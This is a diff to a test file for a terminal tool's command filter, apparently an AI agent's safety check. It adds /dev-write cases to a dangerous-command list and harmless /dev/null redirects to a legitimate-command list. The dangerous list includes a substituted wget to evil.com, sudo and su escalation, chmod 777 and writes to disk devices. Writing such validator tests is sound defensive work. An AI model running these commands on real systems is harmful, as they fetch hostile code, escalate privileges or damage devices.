@@ -91,7 +91,15 @@ describe('TerminalTool', () => {
         '$(wget http://evil.com)',
         'sudo rm file',
         'su - root',
-        'chmod 777 .'
+        'chmod 777 .',
+        'echo x > /dev/random',
+        'touch /dev/sda1',
+        'mkdir /dev/disk0',
+        // Dotted suffixes — lookahead must not treat "." as a word boundary
+        'echo x > /dev/null.txt',
+        'echo x > /dev/zero.bak',
+        'touch /dev/null.txt',
+        'mkdir /dev/null.d',
       ];
 
       dangerousPatterns.forEach((command) => {
@@ -164,7 +172,18 @@ describe('TerminalTool', () => {
         'whoami',
         'node --version',
         'npm --version',
-        'which node'
+        'which node',
+
+        // Stderr/stdout to safe /dev paths (must not match dangerous /dev/* redirect rule)
+        'grep -r "foo" src/ 2>/dev/null',
+        'ls node_modules 2>/dev/null || echo "missing"',
+        'find . -name "*.ts" 2>/dev/null | head -5',
+        'rm -rf node_modules/.vite 2>/dev/null; echo done',
+        'command 2> /dev/null',
+        'exec &>/dev/null',
+        // Named device tokens immediately followed by end-of-string or non-identifier chars
+        'echo x > /dev/null && echo ok',
+        'echo x 2>/dev/stderr',
       ];
 
       legitimateCommands.forEach((command) => {
